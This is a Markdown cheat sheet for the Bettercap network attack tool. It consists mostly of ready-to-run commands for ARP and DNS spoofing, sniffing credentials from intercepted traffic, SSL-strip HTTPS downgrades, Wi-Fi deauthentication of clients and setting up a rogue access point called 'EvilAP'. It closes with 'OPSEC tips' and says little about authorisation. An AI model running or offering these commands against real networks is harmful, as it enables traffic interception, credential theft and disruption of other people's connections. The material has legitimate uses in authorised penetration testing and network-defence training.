## Using `go` (Latest):
```
go install github.com/bettercap/bettercap@latest

```

## 🚀 Starting Bettercap
```
sudo bettercap -iface wlan0
```

Optional: auto-run module/script:
```
sudo bettercap -iface wlan0 -caplet http-ui
```

## 🎯 Interface Commands

bash

CopiarEditar

```
net.show            # Show LAN hosts
net.probe on        # ARP scan (active)
net.recon on        # Discover new hosts passively
net.recon off       # Disable passive recon
net.sniff on        # Start sniffing credentials and data
```

## 🛠️ MITM Setup

### Enable Spoofing & Sniffing
```
set net.sniff.verbose true
net.sniff on
set arp.spoof.targets <IP>
arp.spoof on
```

## DNS Spoofing
```
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.100
dns.spoof on
```

## 🌐 HTTP Proxy / Credential Sniffing
```
http.proxy on
http.server on
```

## Show Logged Credentials
```
events.stream on
```

## 📡 Wi-Fi Attacks
```
wifi.recon on              # Scan nearby APs and clients
wifi.show                  # List scanned devices
wifi.deauth <target>       # Deauth a client
wifi.ap.ssid "EvilAP"      # Set fake AP SSID
wifi.ap.on                 # Start rogue AP
```

## 🔐 HSTS/HTTPS Downgrade (BeEF-style)

Bettercap supports HSTS bypass if the browser is vulnerable (older versions). Requires:
```
http.proxy.sslstrip on
http.proxy on
```

## 📜 Using Caplets (Scripts)

Caplets are script files with Bettercap commands.

### List Built-in Caplets
```
caplets.update
caplets.show
```

## Load Caplet
```
caplets.show          # View available
caplets.install <name>
net.probe on
```

## Example: Load Web UI
```
caplets.update
caplets.show
bettercap -caplet http-ui
```

## 🧾 Logging

Enable logging to file:
```
set events.stream.output mylog.txt
events.stream on
```

## 🔍 Common Modules

|Module|Use|
|---|---|
|`net.sniff`|Packet sniffer with credentials parser|
|`arp.spoof`|ARP MITM spoofing|
|`dns.spoof`|DNS redirection|
|`http.proxy`|Transparent proxy|
|`wifi.ap`|Fake access point|
|`wifi.deauth`|Kick users from networks|

## 🔐 OPSEC Tips

- Monitor Bettercap's footprint on the network
    
- Use with proper isolation (e.g. rogue AP)
    
- Avoid HTTP Proxy on secure networks unless testing

































































